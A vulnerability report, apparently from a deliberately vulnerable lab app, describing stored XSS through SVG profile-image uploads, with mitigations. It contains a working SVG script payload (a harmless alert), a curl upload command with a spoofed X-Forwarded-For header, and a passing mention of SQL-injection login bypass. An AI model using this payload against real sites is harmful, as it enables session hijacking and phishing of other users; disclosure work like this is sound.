# Vulnerability Report: Stored XSS via Malicious SVG File Upload

## 1. Vulnerability Type
Stored Cross-Site Scripting (XSS) via Arbitrary File Upload

## 2. Location
Profile Image Upload (`/profile/upload`)

## 3. Description
The VULN SHOP application has a critical vulnerability in its profile image upload functionality. The server-side validation for uploaded files is insufficient, allowing an attacker to upload files with arbitrary types, such as a Scalable Vector Graphics (SVG) file. Since SVG files can contain embedded JavaScript, an attacker can upload a malicious SVG that, when rendered by a browser, executes arbitrary client-side code.

When a user uploads a new profile image, the file is stored in the `/uploads/` directory, and the user's profile page (`/profile`) is updated to include an `<img>` tag referencing the uploaded file. If a malicious SVG is uploaded, any user (including an administrator) viewing the attacker's profile page will unknowingly execute the embedded script.

## 4. Proof of Concept (PoC)

### Step 1: Log in to the application
An attacker first needs to be authenticated. This can be achieved through legitimate credentials or via an SQL Injection authentication bypass.

### Step 2: Create a malicious SVG file
The attacker creates an SVG file containing a JavaScript payload.

**File: `xss.svg`**
```xml
<svg version="1.1" width="300" height="200" xmlns="http://www.w3.org/2000/svg">
    <rect width="100%" height="100%" fill="green" />
    <text x="150" y="125" font-size="60" text-anchor="middle" fill="white">SVG XSS</text>
    <script>
      alert('XSS from SVG');
    </script>
</svg>
```

### Step 3: Upload the malicious SVG
The attacker uploads the `xss.svg` file using the profile image upload form.

**Request (example using curl):**
```bash
# Assuming cookies.txt contains a valid session from a previous login
curl -X POST -H "X-Forwarded-For: $MY_IP" -b cookies.txt \
-F "profile_image=@xss.svg" \
$TARGET/profile/upload
```

### Step 4: Observe Payload Execution
The server accepts the file and updates the profile page. The response shows that the `<img>` tag now points to the malicious SVG:
```html
<img src="/uploads/xss.svg" alt="Profile" class="profile-img">
```
When any user navigates to the profile page of the user who uploaded the SVG, their browser will fetch and render `/uploads/xss.svg`, executing the embedded `<script>alert('XSS from SVG');</script>` payload.

## 5. Impact
This vulnerability can lead to all the standard impacts of Stored XSS, including:
-   **Session Hijacking:** Stealing cookies and session tokens to impersonate other users.
-   **Defacement:** Modifying the content and appearance of the website.
-   **Phishing:** Injecting fake login forms to steal credentials.
-   **Malware Distribution:** Forcing users to download malicious files.

## 6. Suggested Mitigation
To prevent this type of vulnerability, implement the following security measures:
-   **Strict Server-Side File Type Validation:** Validate uploaded files based on their content (e.g., "magic bytes"), not just the file extension or the `Content-Type` header, which are user-controlled. Only allow a whitelist of safe image formats (e.g., JPEG, PNG, GIF).
-   **Serve User Content from a Separate Domain:** Serve all user-uploaded content from a sandboxed domain that does not have access to session cookies or other sensitive information from the main application domain.
-   **Set `Content-Disposition: attachment`:** For all user-uploaded files, set the `Content-Disposition: attachment` HTTP header. This forces the browser to download the file rather than rendering it inline, preventing scripts from being executed.
-   **Image Sanitization/Re-encoding:** For all uploaded images, re-encode them on the server side. This process will strip out any non-image data, including embedded scripts, while preserving the visual content of the image.
-   **Implement a Content Security Policy (CSP):** A strong CSP can restrict where images and scripts can be loaded from, reducing the risk of XSS attacks.
